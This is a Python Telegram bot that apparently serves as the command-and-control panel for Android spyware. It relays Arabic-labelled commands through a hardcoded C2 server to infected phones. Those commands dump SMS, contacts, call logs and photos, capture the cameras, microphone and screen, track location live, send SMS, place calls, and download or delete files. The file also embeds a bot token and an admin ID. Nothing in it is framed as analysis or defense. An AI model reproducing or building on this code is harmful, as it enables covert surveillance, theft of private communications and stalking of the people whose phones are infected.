import asyncio
import base64
import requests
import threading
import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

C2 = "https://my-server-pjy2.onrender.com"
TOKEN = "9295178707:AAGKrt4aV_0oQlPq3rTywIbDVncLREvxaZk"
ADMIN_ID = 7294984974

SESSION = requests.Session()
SESSION.headers.update({"Connection": "keep-alive"})

def btn(text, action):
    return InlineKeyboardButton(text, callback_data=f"cmd:{action}")

def devices_menu(names):
    return InlineKeyboardMarkup([[InlineKeyboardButton(n, callback_data=f"dev:{n}")] for n in names])

def main_menu(dev):
    return InlineKeyboardMarkup([
        [btn("📩 الرسائل الواردة", "sms_dump"),   btn("📤 الرسائل المرسلة", "sms_sent")],
        [btn("✉️ إرسال رسالة", "send_sms"),       btn("👥 جهات الاتصال", "contacts_dump")],
        [btn("📞 سجل المكالمات", "call_logs"),    btn("📲 اتصال برقم", "call_number")],
        [btn("🔚 إنهاء المكالمة", "end_call"),    btn("📷 كاميرا أمامية", "camera_front")],
        [btn("📸 كاميرا خلفية", "camera_back"),   btn("🎥 تسجيل فيديو", "video_record")],
        [btn("🎤 تسجيل صوت", "mic_record"),       btn("🖼 لقطة شاشة", "screenshot")],
        [btn("🌄 صور المعرض", "gallery_dump"),    btn("📍 موقع الجهاز", "location")],
        [btn("📡 تتبع مباشر", "location_track"),  btn("📁 تصفح الملفات", "file_list")],
        [btn("⬇️ تحميل ملف", "file_download"),    btn("🗑 حذف ملف", "file_delete")],
        [btn("🔍 بحث عن ملف", "file_search"),     btn("🌐 فتح رابط", "open_url")],
        [btn("💬 رسالة منبثقة", "toast"),         btn("📳 اهتزاز", "vibrate")],
        [btn("🖼 تغيير الخلفية", "set_wallpaper"), btn("🔊 تشغيل صوت", "play_sound")],
        [btn("🎚 مستوى الصوت", "set_volume"),     btn("📶 تشغيل الواي فاي", "wifi_toggle")],
        [btn("🔵 تشغيل البلوتوث", "bt_toggle"),   btn("📱 معلومات الجهاز", "device_info")],
        [btn("📲 التطبيقات المثبتة", "app_list"), btn("🔋 حالة البطارية", "battery")],
        [btn("📶 شبكة الواي فاي", "wifi_info"),   btn("🔙 رجوع", "back")],
    ])

DEFAULTS = {
    "mic_record": {"seconds": 10}, "video_record": {"seconds": 10},
    "file_list": {"path": "/sdcard"}, "file_download": {"path": "/sdcard/Download"},
    "file_delete": {"path": "/sdcard/tmp.txt"}, "file_search": {"query": ".jpg"},
    "open_url": {"url": "https://google.com"}, "toast": {"msg": "مرحبا"},
    "vibrate": {"ms": 1000}, "set_wallpaper": {"path": "/sdcard/wall.jpg"},
    "play_sound": {"uri": "default"}, "set_volume": {"level": 15},
    "wifi_toggle": {"on": True}, "bt_toggle": {"on": True},
    "send_sms": {"number": "+123456", "text": "hi"}, "call_number": {"number": "+123456"},
}

ARABIC_NAME = {
    "sms_dump": "الرسائل الواردة", "sms_sent": "الرسائل المرسلة",
    "send_sms": "إرسال رسالة", "contacts_dump": "جهات الاتصال",
    "call_logs": "سجل المكالمات", "call_number": "اتصال برقم",
    "end_call": "إنهاء المكالمة", "camera_front": "كاميرا أمامية",
    "camera_back": "كاميرا خلفية", "video_record": "تسجيل فيديو",
    "mic_record": "تسجيل صوت", "screenshot": "لقطة شاشة",
    "gallery_dump": "صور المعرض", "location": "موقع الجهاز",
    "location_track": "تتبع مباشر", "file_list": "تصفح الملفات",
    "file_download": "تحميل ملف", "file_delete": "حذف ملف",
    "file_search": "بحث عن ملف", "open_url": "فتح رابط",
    "toast": "رسالة منبثقة", "vibrate": "اهتزاز",
    "set_wallpaper": "تغيير الخلفية", "play_sound": "تشغيل صوت",
    "set_volume": "مستوى الصوت", "wifi_toggle": "تشغيل الواي فاي",
    "bt_toggle": "تشغيل البلوتوث", "device_info": "معلومات الجهاز",
    "app_list": "التطبيقات المثبتة", "battery": "حالة البطارية",
    "wifi_info": "شبكة الواي فاي",
}

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        r = SESSION.get(f"{C2}/devices", timeout=15).json()
    except Exception as e:
        await update.message.reply_text(f"تعذر الاتصال بالسيرفر.\n{e}")
        return
    names = r.get("devices", [])
    if not names:
        await update.message.reply_text("ما في أجهزة متصلة الحين.")
        return
    await update.message.reply_text("اختر الجهاز:", reply_markup=devices_menu(names))

async def on_device(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if update.effective_user.id != ADMIN_ID: return
    dev = q.data.split(":", 1)[1]
    ctx.user_data["device"] = dev
    await q.edit_message_text(f"الجهاز: {dev}\nاختر ما تريد:", reply_markup=main_menu(dev))

async def on_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if update.effective_user.id != ADMIN_ID: return
    action = q.data.split(":", 1)[1]
    dev = ctx.user_data.get("device")

    if action == "back" or not dev:
        ctx.user_data.clear()
        try:
            names = SESSION.get(f"{C2}/devices", timeout=15).json().get("devices", [])
        except Exception:
            names = []
        if not names:
            await q.edit_message_text("ما في أجهزة متصلة.")
            return
        await q.edit_message_text("اختر الجهاز:", reply_markup=devices_menu(names))
        return

    label = ARABIC_NAME.get(action, action)
    await q.edit_message_text(f"{label}... جارٍ التنفيذ")

    args = DEFAULTS.get(action, {})
    try:
        r = SESSION.post(f"{C2}/cmd/{dev}", json={"action": action, "args": args}, timeout=40).json()
    except Exception as e:
        await q.edit_message_text(f"{label}\nفشل الاتصال: {e}")
        return

    if not r.get("ok"):
        await q.edit_message_text(f"{label}\nفشل: {r.get('error')}")
        return

    result = r.get("result")
    
    if isinstance(result, dict) and "file_b64" in result:
        file_data = base64.b64decode(result["file_b64"])
        filename = result.get("filename", "file.bin")
        await ctx.bot.send_document(
            chat_id=update.effective_chat.id,
            document=InputFile(file_data, filename=filename),
            caption=f"*{label}*", parse_mode="Markdown"
        )
    elif isinstance(result, str) and len(result) > 3800:
        for i in range(0, len(result), 3800):
            await ctx.bot.send_message(chat_id=update.effective_chat.id, text=f"*{label}*\n```\n{result[i:i+3800]}\n```", parse_mode="Markdown")
    else:
        text = str(result) if result is not None else "(فارغ)"
        await ctx.bot.send_message(chat_id=update.effective_chat.id, text=f"*{label}*\n```\n{text}\n```", parse_mode="Markdown")

    await ctx.bot.send_message(chat_id=update.effective_chat.id, text="تمام. اختر زر ثاني:", reply_markup=main_menu(dev))

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a): pass

def run_health():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()

def main():
    threading.Thread(target=run_health, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(on_device, pattern=r"^dev:"))
    app.add_handler(CallbackQueryHandler(on_command, pattern=r"^cmd:"))
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()
